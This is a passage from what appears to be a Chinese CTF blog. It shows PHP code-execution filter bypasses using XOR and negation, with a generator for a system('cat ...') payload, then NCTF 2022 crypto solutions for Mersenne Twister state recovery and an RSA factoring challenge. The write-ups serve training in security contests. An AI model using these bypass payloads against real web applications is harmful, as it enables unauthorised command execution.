class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">^ ^ ? = a <span class="number">97</span></span><br><span class="line">_ ^ &gt; = a <span class="number">97</span></span><br><span class="line">? ^ ^ = a <span class="number">97</span></span><br><span class="line">&lt; ^ ] = a <span class="number">97</span></span><br><span class="line">&gt; ^ _ = a <span class="number">97</span></span><br><span class="line">] ^ &lt; = a <span class="number">97</span></span><br><span class="line">^ ^ &lt; = b <span class="number">98</span></span><br><span class="line">? ^ ] = b <span class="number">98</span></span><br><span class="line">&lt; ^ ^ = b <span class="number">98</span></span><br><span class="line">] ^ ? = b <span class="number">98</span></span><br><span class="line"><span class="meta">@ ^ </span><span class="comment"># = c 99</span></span><br><span class="line"><span class="comment"># ^ @ = c 99</span></span><br><span class="line">_ ^ &lt; = c <span class="number">99</span></span><br><span class="line">&lt; ^ _ = c <span class="number">99</span></span><br><span class="line">&gt; ^ ] = c <span class="number">99</span></span><br><span class="line">] ^ &gt; = c <span class="number">99</span></span><br><span class="line"><span class="meta">@ ^ $ = d <span class="number">100</span></span></span><br><span class="line">$ ^ @ = d <span class="number">100</span></span><br><span class="line">? ^ [ = d <span class="number">100</span></span><br><span class="line">[ ^ ? = d <span class="number">100</span></span><br><span class="line"><span class="meta">@ ^ % = e <span class="number">101</span></span></span><br><span class="line">% ^ @ = e <span class="number">101</span></span><br><span class="line">&gt; ^ [ = e <span class="number">101</span></span><br><span class="line">[ ^ &gt; = e <span class="number">101</span></span><br><span class="line"><span class="meta">@ ^ &amp; = f <span class="number">102</span></span></span><br><span class="line">&amp; ^ @ = f <span class="number">102</span></span><br><span class="line">&lt; ^ [ = g <span class="number">103</span></span><br><span class="line">[ ^ &lt; = g <span class="number">103</span></span><br><span class="line"><span class="meta">@ ^ (<span class="params"> = h <span class="number">104</span></span></span></span><br><span class="line"><span class="params"><span class="meta">(<span class="params"> ^ @ = h <span class="number">104</span></span></span></span></span><br><span class="line"><span class="params"><span class="params"><span class="meta">@ ^ </span>) = i <span class="number">105</span></span></span></span><br><span class="line"><span class="params"><span class="meta"></span>) ^ @ = i <span class="number">105</span></span></span><br><span class="line"><span class="meta">@ ^ * = j <span class="number">106</span></span></span><br><span class="line">* ^ @ = j <span class="number">106</span></span><br><span class="line"><span class="meta">@ ^ + = k <span class="number">107</span></span></span><br><span class="line">+ ^ @ = k <span class="number">107</span></span><br><span class="line"><span class="meta">@ ^ , = l <span class="number">108</span></span></span><br><span class="line">, ^ @ = l <span class="number">108</span></span><br><span class="line">- ^ @ = m <span class="number">109</span></span><br><span class="line"><span class="meta">@ ^ - = m <span class="number">109</span></span></span><br><span class="line"><span class="meta">@ ^ . = n <span class="number">110</span></span></span><br><span class="line">. ^ @ = n <span class="number">110</span></span><br><span class="line"><span class="meta">@ ^ / = o <span class="number">111</span></span></span><br><span class="line">/ ^ @ = o <span class="number">111</span></span><br><span class="line">- ^ ] = p <span class="number">112</span></span><br><span class="line">^ ^ . = p <span class="number">112</span></span><br><span class="line">_ ^ / = p <span class="number">112</span></span><br><span class="line">+ ^ [ = p <span class="number">112</span></span><br><span class="line">/ ^ _ = p <span class="number">112</span></span><br><span class="line">. ^ ^ = p <span class="number">112</span></span><br><span class="line">[ ^ + = p <span class="number">112</span></span><br><span class="line">] ^ - = p <span class="number">112</span></span><br><span class="line">^ ^ / = q <span class="number">113</span></span><br><span class="line">* ^ [ = q <span class="number">113</span></span><br><span class="line">_ ^ . = q <span class="number">113</span></span><br><span class="line">/ ^ ^ = q <span class="number">113</span></span><br><span class="line">. ^ _ = q <span class="number">113</span></span><br><span class="line">, ^ ] = q <span class="number">113</span></span><br><span class="line">[ ^ * = q <span class="number">113</span></span><br><span class="line">] ^ , = q <span class="number">113</span></span><br><span class="line">- ^ _ = r <span class="number">114</span></span><br><span class="line">^ ^ , = r <span class="number">114</span></span><br><span class="line">_ ^ - = r <span class="number">114</span></span><br><span class="line">/ ^ ] = r <span class="number">114</span></span><br><span class="line">, ^ ^ = r <span class="number">114</span></span><br><span class="line">[ ^ ) = r <span class="number">114</span></span><br><span class="line">] ^ / = r <span class="number">114</span></span><br><span class="line">) ^ [ = r <span class="number">114</span></span><br><span class="line">- ^ ^ = s <span class="number">115</span></span><br><span class="line">^ ^ - = s <span class="number">115</span></span><br><span class="line">_ ^ , = s <span class="number">115</span></span><br><span class="line">. ^ ] = s <span class="number">115</span></span><br><span class="line">, ^ _ = s <span class="number">115</span></span><br><span class="line">[ ^ ( = s <span class="number">115</span></span><br><span class="line">] ^ . = s <span class="number">115</span></span><br><span class="line">( ^ [ = s <span class="number">115</span></span><br><span class="line">^ ^ * = t <span class="number">116</span></span><br><span class="line">* ^ ^ = t <span class="number">116</span></span><br><span class="line">_ ^ + = t <span class="number">116</span></span><br><span class="line">+ ^ _ = t <span class="number">116</span></span><br><span class="line">/ ^ [ = t <span class="number">116</span></span><br><span class="line">[ ^ / = t <span class="number">116</span></span><br><span class="line">] ^ ) = t <span class="number">116</span></span><br><span class="line">) ^ ] = t <span class="number">116</span></span><br><span class="line">^ ^ + = u <span class="number">117</span></span><br><span class="line">* ^ _ = u <span class="number">117</span></span><br><span class="line">_ ^ * = u <span class="number">117</span></span><br><span class="line">+ ^ ^ = u <span class="number">117</span></span><br><span class="line">. ^ [ = u <span class="number">117</span></span><br><span class="line">[ ^ . = u <span class="number">117</span></span><br><span class="line">] ^ ( = u <span class="number">117</span></span><br><span class="line">( ^ ] = u <span class="number">117</span></span><br><span class="line">- ^ [ = v <span class="number">118</span></span><br><span class="line">^ ^ ( = v <span class="number">118</span></span><br><span class="line">_ ^ ) = v <span class="number">118</span></span><br><span class="line">+ ^ ] = v <span class="number">118</span></span><br><span class="line">[ ^ - = v <span class="number">118</span></span><br><span class="line">] ^ + = v <span class="number">118</span></span><br><span class="line">( ^ ^ = v <span class="number">118</span></span><br><span class="line">) ^ _ = v <span class="number">118</span></span><br><span class="line">^ ^ ) = w <span class="number">119</span></span><br><span class="line">* ^ ] = w <span class="number">119</span></span><br><span class="line">_ ^ ( = w <span class="number">119</span></span><br><span class="line">, ^ [ = w <span class="number">119</span></span><br><span class="line">[ ^ , = w <span class="number">119</span></span><br><span class="line">] ^ * = w <span class="number">119</span></span><br><span class="line">( ^ _ = w <span class="number">119</span></span><br><span class="line">) ^ ^ = w <span class="number">119</span></span><br><span class="line"><span class="comment"># ^ [ = x 120</span></span><br><span class="line">% ^ ] = x <span class="number">120</span></span><br><span class="line">^ ^ &amp; = x <span class="number">120</span></span><br><span class="line">&amp; ^ ^ = x <span class="number">120</span></span><br><span class="line">[ ^ <span class="comment"># = x 120</span></span><br><span class="line">] ^ % = x <span class="number">120</span></span><br><span class="line">$ ^ ] = y <span class="number">121</span></span><br><span class="line">&amp; ^ _ = y <span class="number">121</span></span><br><span class="line">_ ^ &amp; = y <span class="number">121</span></span><br><span class="line">] ^ $ = y <span class="number">121</span></span><br><span class="line">$ ^ ^ = z <span class="number">122</span></span><br><span class="line">% ^ _ = z <span class="number">122</span></span><br><span class="line">^ ^ $ = z <span class="number">122</span></span><br><span class="line">_ ^ % = z <span class="number">122</span></span><br></pre></td></tr></table></figure>

<p>例如  flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; ^ @ = f <span class="number">102</span></span><br><span class="line"><span class="meta">@ ^ , = l <span class="number">108</span></span></span><br><span class="line">^ ^ ? = a <span class="number">97</span></span><br><span class="line">&lt; ^ [ = g <span class="number">103</span></span><br><span class="line">flag = <span class="string">&#x27;&amp;@^&lt;&#x27;</span>^<span class="string">&#x27;@,?[&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-取反绕过"><a href="#2-取反绕过" class="headerlink" title="2.取反绕过"></a>2.取反绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EXP如下</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code1</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$code2</span>=<span class="string">&quot;cat /flllllaaaaaaggggggg&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?wllm=(~&quot;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$code1</span>).<span class="string">&quot;)(~&quot;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$code2</span>).<span class="string">&quot;);&quot;</span>;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2022NCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/14/2022NCTF/"
    >2022NCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/14/2022NCTF/" class="article-date">
  <time datetime="2023-03-14T14:04:55.000Z" itemprop="datePublished">2023-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="2022NCTF"><a href="#2022NCTF" class="headerlink" title="2022NCTF"></a>2022NCTF</h1><p>这次Crypto题目对于我来说过于困难，还好战队的佬写了wp</p>
<h2 id="Coloratura"><a href="#Coloratura" class="headerlink" title="Coloratura"></a>Coloratura</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/2023/03/14/2022NCTF/attach.png" alt="attach"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">width = <span class="number">208</span></span><br><span class="line">height = <span class="number">208</span></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeSourceImg</span>():</span><br><span class="line">    colors = long_to_bytes(getrandbits(width * height * <span class="number">24</span>))[::-<span class="number">1</span>]</span><br><span class="line">    img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            img.putpixel((j, i), (colors[x], colors[x + <span class="number">1</span>], colors[x + <span class="number">2</span>]))</span><br><span class="line">            x += <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeFlagImg</span>():</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    draw.text((<span class="number">5</span>, <span class="number">5</span>), flag, fill=(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> img</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    img1 = makeSourceImg()</span><br><span class="line">    img2 = makeFlagImg()</span><br><span class="line">    img3 = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">            p1, p2 = img1.getpixel((j, i)), img2.getpixel((j, i))</span><br><span class="line">            img3.putpixel((j, i), <span class="built_in">tuple</span>([(p1[k] ^ p2[k]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]))</span><br><span class="line">    img3.save(<span class="string">&#x27;attach.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_shift</span>(<span class="params">x, shift, <span class="built_in">type</span>, mask=<span class="number">0xffffffff</span>, nbit=<span class="number">32</span></span>):</span><br><span class="line">    res = x</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nbit//shift):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;l&#x27;</span>: res = x ^ res &lt;&lt; shift &amp; mask</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;r&#x27;</span>: res = x ^ res &gt;&gt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_extract</span>(<span class="params">x</span>):</span><br><span class="line">    x = inverse_shift(x, <span class="number">18</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    x = inverse_shift(x, <span class="number">15</span>, <span class="string">&#x27;l&#x27;</span>, <span class="number">4022730752</span>)</span><br><span class="line">    x = inverse_shift(x,  <span class="number">7</span>, <span class="string">&#x27;l&#x27;</span>, <span class="number">2636928640</span>)</span><br><span class="line">    x = inverse_shift(x, <span class="number">11</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_twist</span>(<span class="params">cur</span>):</span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>]^state[(i+<span class="number">396</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">x</span>):</span><br><span class="line">    y = x</span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">11</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">7</span> &amp; <span class="number">2636928640</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">width = <span class="number">208</span></span><br><span class="line">height = <span class="number">208</span></span><br><span class="line">img3 = Image.<span class="built_in">open</span>(<span class="string">&#x27;attach.png&#x27;</span>)</span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        pix = img3.getpixel((j, i))</span><br><span class="line">        out += [pix[<span class="number">0</span>], pix[<span class="number">1</span>], pix[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line">out = [<span class="built_in">hex</span>(_)[<span class="number">2</span>:].zfill(<span class="number">2</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> out][::-<span class="number">1</span>]</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line">now_rand = [out[i: i + <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(out), <span class="number">8</span>)][::-<span class="number">1</span>]</span><br><span class="line">now_rand = [<span class="built_in">int</span>(_, <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> now_rand]</span><br><span class="line"></span><br><span class="line">state = [crack_extract(_) <span class="keyword">for</span> _ <span class="keyword">in</span> now_rand[-<span class="number">624</span>:]]</span><br><span class="line">ini_rand = []</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(ini_rand) &lt; <span class="built_in">len</span>(now_rand):</span><br><span class="line">    ini_rand = [extract(_) <span class="keyword">for</span> _ <span class="keyword">in</span> state] + ini_rand</span><br><span class="line">    state = crack_twist(state)</span><br><span class="line"></span><br><span class="line">ini_rand = [<span class="built_in">hex</span>(_)[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> ini_rand][::-<span class="number">1</span>]</span><br><span class="line">ini_rand = <span class="string">&#x27;&#x27;</span>.join(ini_rand)</span><br><span class="line">ini = [ini_rand[i: i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ini_rand), <span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">ini = [<span class="built_in">int</span>(_, <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> ini]</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">flag = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        pix = img3.getpixel((j, i))</span><br><span class="line">        flag.putpixel((j, i), (pix[<span class="number">0</span>] ^ ini[x], pix[<span class="number">1</span>] ^ ini[x + <span class="number">1</span>], pix[<span class="number">2</span>] ^ ini[x + <span class="number">2</span>]))</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">flag.show()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/14/2022NCTF/MyBlog\source_posts\2022NCTF.assets\image-20230314213110239.png" alt="image-20230314213110239"></p>
<h2 id="dp-promax"><a href="#dp-promax" class="headerlink" title="dp_promax"></a>dp_promax</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbits = <span class="number">2200</span></span><br><span class="line">beta = <span class="number">0.4090</span></span><br><span class="line">p, q = getPrime(<span class="built_in">int</span>((<span class="number">1.</span> - beta) * nbits)), getPrime(<span class="built_in">int</span>(beta * nbits))</span><br><span class="line">dp = getrandbits(<span class="number">50</span>) | <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = (p - <span class="number">1</span>) * getrandbits(<span class="number">2800</span>) + dp</span><br><span class="line">    <span class="keyword">if</span> GCD((p - <span class="number">1</span>) * (q - <span class="number">1</span>), d) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">N = p * q</span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, N)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">46460689902575048279161539093139053273250982188789759171230908555090160106327807756487900897740490796014969642060056990508471087779067462081114448719679327369541067729981885255300592872671988346475325995092962738965896736368697583900712284371907712064418651214952734758901159623911897535752629528660173915950061002261166886570439532126725549551049553283657572371862952889353720425849620358298698866457175871272471601283362171894621323579951733131854384743239593412466073072503584984921309839753877025782543099455341475959367025872013881148312157566181277676442222870964055594445667126205022956832633966895316347447629237589431514145252979687902346011013570026217</span></span><br><span class="line"><span class="string">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line"><span class="string">28467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>发现N可以分解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line">c = <span class="number">28467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294</span></span><br><span class="line">p=<span class="number">3628978044425516256252147348112819551863749940058657194357489608704171827031473111609089635738827298682760802716155197142949509565102167059366421892847010862457650295837231017990389942425249509044223464186611269388650172307612888367710149054996350799445205007925937223059</span></span><br><span class="line">q=<span class="number">12802692475349485610473781287027553390253771106432654573503896144916729600503566568750388778199186889792482907407718147190530044920232683163941552482789952714283570754056433670735303357508451647073211371989388879428065367142825533019883798121260838408498282273223302509241229258595176130544371781524298142815099491753819782913040582455136982147010841337850805642005577584947943848348285516563</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span 